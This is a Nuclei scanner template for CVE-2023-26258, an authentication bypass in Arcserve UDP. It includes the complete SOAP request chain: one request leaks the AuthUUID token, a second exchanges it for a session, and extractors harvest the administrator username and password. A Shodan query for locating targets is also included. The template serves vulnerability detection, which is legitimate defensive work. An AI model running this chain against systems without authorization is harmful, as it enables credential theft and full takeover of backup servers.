templates/projectdiscovery-nuclei-templates__CVE-2023-26258.yaml

flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: auth_uuid
    part: body
    regex:
    - <ns5:authUUID>([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})</ns5:authUUID>
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/xml")
    - contains(body, "ns5:authUUID")
    internal: true
    type: dsl
  raw:
  - "POST /WebServiceImpl/services/FlashServiceImpl HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<S:Envelope\
    \ xmlns:S=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <S:Body>\n    <ns2:getVersionInfo\n\
    \        xmlns:ns2=\"http://webservice.arcflash.ca.com\"\n        xmlns:ns3=\"\
    http://backup.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns4=\"http://data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns5=\"http://export.data.webservice.arcflash.ca.com/xsd\"\n  \
    \      xmlns:ns6=\"http://vsphere.data.webservice.arcflash.ca.com/xsd\"\n    \
    \    xmlns:ns7=\"http://browse.data.webservice.arcflash.ca.com/xsd\"\n       \
    \ xmlns:ns8=\"http://restore.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns9=\"\
    http://catalog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns10=\"http://activitylog.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns11=\"http://remotedeploy.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns12=\"http://history.job.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns13=\"http://webservice.edge.arcserve.ca.com/\"/>\n  </S:Body>\n\
    </S:Envelope>\n"
- extractors:
  - group: 1
    part: body
    regex:
    - <ns5:userName>(.*?)</ns5:userName>
    type: regex
  - group: 1
    part: body
    regex:
    - <ns5:password>(.*?)</ns5:password>
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/xml")
    - contains_all(body, "ns5:uuid", "ns5:userName", "ns5:password")
    type: dsl
  raw:
  - "POST /WebServiceImpl/services/VirtualStandbyServiceImpl HTTP/1.1\nHost: {{Hostname}}\n\
    SOAPAction: \"<http://webservice.arcflash.ca.com/IEdgeDashboardService/validateUserByUUIDRequest>\"\
    \nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<S:Envelope\
    \ xmlns:S=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <S:Body>\n    <ns2:validateUserByUUID\n\
    \        xmlns:ns2=\"http://webservice.arcflash.ca.com\"\n        xmlns:ns3=\"\
    http://backup.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns4=\"http://data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns5=\"http://export.data.webservice.arcflash.ca.com/xsd\"\n  \
    \      xmlns:ns6=\"http://vsphere.data.webservice.arcflash.ca.com/xsd\"\n    \
    \    xmlns:ns7=\"http://browse.data.webservice.arcflash.ca.com/xsd\"\n       \
    \ xmlns:ns8=\"http://restore.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns9=\"\
    http://catalog.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns10=\"http://activitylog.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns11=\"http://remotedeploy.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns12=\"http://history.job.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns13=\"http://webservice.edge.arcserve.ca.com/\">\n        <arg0>{{auth_uuid}}</arg0>\n\
    \    </ns2:validateUserByUUID>\n  </S:Body>\n</S:Envelope>\n"
  - "POST /WebServiceImpl/services/FlashServiceImpl HTTP/1.1\nHost: {{Hostname}}\n\
    SOAPAction: \"<http://webservice.arcflash.ca.com/IFlashService_R16_5/getVersionInfoRequest>\"\
    \nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <S:Envelope\
    \ xmlns:S=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <S:Body>\n     \
    \ <ns2:getLocalHostAsTrust\n        xmlns:ns2=\"http://webservice.arcflash.ca.com\"\
    \n        xmlns:ns3=\"http://backup.data.webservice.arcflash.ca.com/xsd\"\n  \
    \      xmlns:ns4=\"http://data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns5=\"\
    http://export.data.webservice.arcflash.ca.com/xsd\"\n        xmlns:ns6=\"http://vsphere.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns7=\"http://browse.data.webservice.arcflash.ca.com/xsd\"\n  \
    \      xmlns:ns8=\"http://restore.data.webservice.arcflash.ca.com/xsd\"\n    \
    \    xmlns:ns9=\"http://catalog.data.webservice.arcflash.ca.com/xsd\"\n      \
    \  xmlns:ns10=\"http://activitylog.data.webservice.arcflash.ca.com/xsd\"\n   \
    \     xmlns:ns11=\"http://remotedeploy.data.webservice.arcflash.ca.com/xsd\"\n\
    \        xmlns:ns12=\"http://history.job.data.webservice.arcflash.ca.com/xsd\"\
    \n        xmlns:ns13=\"http://webservice.edge.arcserve.ca.com/\"\n      >\n  \
    \    </ns2:getLocalHostAsTrust>\n    </S:Body>\n  </S:Envelope>\n"
id: CVE-2023-26258
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:arcserve:udp:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-26258
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-863
    epss-percentile: 0.9875
    epss-score: 0.73541
  description: 'Arcserve UDP through 9.0.6034 allows authentication bypass. The method
    getVersionInfo at WebServiceImpl/services/FlashServiceImpl leaks the AuthUUID
    token. This token can be used at /WebServiceImpl/services/VirtualStandbyServiceImpl
    to obtain a valid session. This session can be used to execute any task as administrator.

    '
  impact: 'Unauthenticated attackers can bypass authentication by leaking the AuthUUID
    token, allowing them to execute any administrative task and potentially compromise
    all backup data managed by Arcserve UDP.

    '
  metadata:
    max-request: 3
    product: udp
    shodan-query: http.favicon.hash:-1889244460
    vendor: arcserve
    verified: true
  name: Arcserve UDP <= 9.0.6034 - Authentication Bypass
  reference:
  - https://www.mdsec.co.uk/2023/06/cve-2023-26258-remote-code-execution-in-arcserve-udp-backup/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-26258
  remediation: 'Upgrade to Arcserve UDP version 9.1 or later that addresses this authentication
    bypass vulnerability.

    '
  severity: critical
  tags: cve,cve2023,arcserve,auth-bypass,vkev,vuln
